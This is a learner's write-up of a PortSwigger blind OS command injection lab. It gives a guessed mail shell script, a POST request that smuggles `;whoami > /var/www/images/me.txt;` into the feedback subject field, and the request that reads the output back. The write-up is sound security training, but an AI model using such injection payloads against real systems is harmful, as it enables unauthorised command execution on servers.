# [Blind OS command injection with output redirection] — [PortSwigger] — [Practitioner]
**Date:** 2026-06-16
 
---
 
## Vulnerability / core concept
Blind OS Command Injection

## What made me stuck
This level was easy to understand and implement after some practice with other labs in PortSwigger.
 
## What unblocked me
`null`
 
---


## Attack path
1) During inspection, we can notice that this web application contains `Submit feedback` functionality. It takes `name`, `email`, `subject` and `message` inputs from user and send email via shell script.
2) To be able to execute an OS command injection attack, we first need to understand what shell script looks like approximately. Using AI is very helpful for this purpose.
3) After understanding attack vectors, we can start inserting our malicious payloads and execute arbitrary os commands in the server. In this specific lab, we need to send the output of `whoami` command to `/var/www/images/` folder and then retrieve it to solve the lab.

---


## Payload / key command
The shell script approximately looks like this:
```bash
#!/bin/bash
name="$1"
email="$2"
subject="$3"
message="$4"

mail -s $subject "you@example.com" <<EOF
From: $name <$email>

$message
EOF
```
Here, I tried to exploit the `$subject` and insert a malicious payload there. This was the request that I has sent:
```bash
POST /feedback/submit HTTP/1.1
...

csrf=PpOD9ilMmZSH7ltkLa8CF5conGYGGgjJ&name=adf&email=adf%40adsf&subject="%3Bwhoami%20%3E%20%2Fvar%2Fwww%2Fimages%2Fme.txt%3Becho%20"&message=afd
```
My URL decoded payload is `";whoami > /var/www/images/me.txt;echo "`. This payload ends `mail` command with empty string `""` and `;`. Then we execute our malicious attack and send the output of `whoami` to `/var/www/images/` folder and also end it with `;`. We use `echo "` to make sure our script is not getting any errors that can intervene with out payload.

Now, we need to read the output of our payload by using the following request:
```bash
GET /image?filename=me.txt HTTP/1.1
...
```

Note: This payload worked for this lab, but in other cases we might have to change our payload to make it work as not all shell scripts are the same.

---


## What I'd recognize faster next time
If web application does not return any outputs in either browser or response, then we need to find some way to extract those data during our attacks. We can use various methods for this: we can send data to some folder and then access it through browser like we did it in this lab, or we can use out-of-band requests to our exploit server to read the output.


